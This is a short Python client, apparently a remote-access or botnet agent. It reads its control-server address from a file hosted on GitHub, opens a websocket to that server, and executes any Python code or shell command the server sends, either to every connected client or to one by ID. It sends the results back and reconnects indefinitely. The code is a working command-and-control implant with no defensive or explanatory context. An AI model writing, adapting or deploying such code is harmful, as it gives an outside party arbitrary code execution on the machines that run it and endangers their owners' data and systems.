import asyncio
import websockets
import requests
import socket
import json
import time
import subprocess
import os
import uuid

ID_FILE = "client_id.txt"

def get_client_id():
    if os.path.exists(ID_FILE):
        with open(ID_FILE, "r") as f:
            return f.read().strip()
    cid = str(uuid.uuid4())
    with open(ID_FILE, "w") as f:
        f.write(cid)
    return cid

CLIENT_ID = get_client_id()

def get_address():
    url = "https://raw.githubusercontent.com/rustemtess/simple_controller/main/address.txt"
    try:
        return requests.get(url, timeout=5).text.strip()
    except:
        return None

def has_internet():
    try:
        requests.get("https://1.1.1.1", timeout=3)
        return True
    except:
        return False

async def connect_and_listen(address):
    async with websockets.connect(f"wss://{address}") as ws:
        await ws.send(json.dumps({"id": CLIENT_ID}))

        while True:
            msg = await ws.recv()
            data = json.loads(msg)
            to = data.get("to")
            if to not in ("all", CLIENT_ID):
                continue

            cmd_type = data.get("type")
            content = data.get("cmd")

            try:
                if cmd_type == "python":
                    exec(content, globals())
                    await ws.send(json.dumps({"id": CLIENT_ID, "output": "Python executed"}))
                elif cmd_type == "cmd":
                    result = subprocess.getoutput(content)
                    await ws.send(json.dumps({"id": CLIENT_ID, "output": result}))
            except Exception as e:
                await ws.send(json.dumps({"id": CLIENT_ID, "error": str(e)}))


async def main():
    while True:
        if not has_internet():
            time.sleep(60)
            continue

        address = get_address()
        print(address)
        if not address:
            time.sleep(60)
            continue

        try:
            await connect_and_listen(address)
        except Exception as e:
            print("Error")
            time.sleep(120)

if __name__ == "__main__":
    asyncio.run(main())
